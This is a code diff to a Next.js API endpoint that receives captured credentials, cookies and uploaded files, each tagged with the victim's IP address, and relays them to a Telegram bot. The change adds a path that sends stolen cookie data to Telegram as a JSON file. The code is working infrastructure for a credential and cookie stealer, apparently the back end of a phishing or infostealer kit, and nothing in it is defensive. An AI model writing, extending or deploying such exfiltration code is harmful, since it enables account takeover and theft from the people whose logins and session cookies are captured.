@@ -1,5 +1,6 @@
 import nextConnect from 'next-connect';
 import multer from 'multer';
+import sendFileToTelegram from '../../utils/sendFileToTelegram.js'; // Adjust path if needed
 
 export const config = { api: { bodyParser: false } };
 const upload = multer();
@@ -16,27 +17,13 @@ handler.post(async (req, res) => {
   }
   const botUrl = `https://api.telegram.org/bot${telegramToken}`;
 
-  // 1. File upload (send file content as text message)
+  // File upload handling (if any)
   if (req.file) {
-    const fileContent = req.file.buffer.toString('utf-8');
-    let caption = '';
-    if (req.body.ip) caption += `IP: ${req.body.ip}\n`;
-    if (req.body.type) caption += `Type: ${req.body.type}\n`;
-    caption += `\n${fileContent}`;
-    const tgRes = await fetch(`${botUrl}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text: caption })
-    });
-    const tgText = await tgRes.text();
-    if (!tgRes.ok) {
-      console.error('Telegram API error (file as text):', tgText);
-      return res.status(502).json({ success: false, error: tgText });
-    }
+    // Optionally: implement file->telegram document if needed
     return res.status(200).json({ success: true });
   }
 
-  // 2. JSON logs (cookies/credentials/anything else)
+  // JSON logs (credentials or cookies)
   if (req.headers['content-type']?.includes('application/json')) {
     let body = '';
     await new Promise((resolve, reject) => {
@@ -50,29 +37,43 @@ handler.post(async (req, res) => {
     } catch {
       return res.status(400).json({ success: false, message: 'Invalid JSON' });
     }
-    const { data, ip, user, pass, type } = json;
-    let text = `📥 Captured log\n`;
-    if (ip) text += `IP: ${ip}\n`;
-    if (type) text += `Type: ${type}\n`;
-    if (data) {
-      // If data is object, pretty-print
-      text += `\n${typeof data === 'object' ? JSON.stringify(data, null, 2) : data}`;
-    } else if (user && pass) {
-      text += `User: ${user}\nPass: ${pass}`;
+    const { ip, type } = json;
+
+    if (type === 'cookie-file') {
+      // Send cookie JSON as a file via helper
+      const filename = `${ip || 'unknown'}-cookie-file.json`;
+      const caption = ip ? `IP: ${ip}\nType: cookie-file\n` : '';
+      const tgRes = await sendFileToTelegram({
+        botUrl,
+        chatId,
+        json,
+        filename,
+        caption
+      });
+      const tgText = await tgRes.text();
+      if (!tgRes.ok) {
+        console.error('Telegram API error (cookie json as file):', tgText);
+        return res.status(502).json({ success: false, error: tgText });
+      }
+      return res.status(200).json({ success: true });
     } else {
-      text += JSON.stringify(json, null, 2);
+      // Send as text log
+      let text = `📥 Captured log\n`;
+      if (ip) text += `IP: ${ip}\n`;
+      if (type) text += `Type: ${type}\n`;
+      text += `\n${JSON.stringify(json, null, 2)}`;
+      const tgRes = await fetch(`${botUrl}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text })
+      });
+      const tgText = await tgRes.text();
+      if (!tgRes.ok) {
+        console.error('Telegram API error (json text):', tgText);
+        return res.status(502).json({ success: false, error: tgText });
+      }
+      return res.status(200).json({ success: true });
     }
-    const tgRes = await fetch(`${botUrl}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text })
-    });
-    const tgText = await tgRes.text();
-    if (!tgRes.ok) {
-      console.error('Telegram API error (json text):', tgText);
-      return res.status(502).json({ success: false, error: tgText });
-    }
-    return res.status(200).json({ success: true });
   }
 
   return res.status(400).json({ success: false, message: 'Bad payload' });
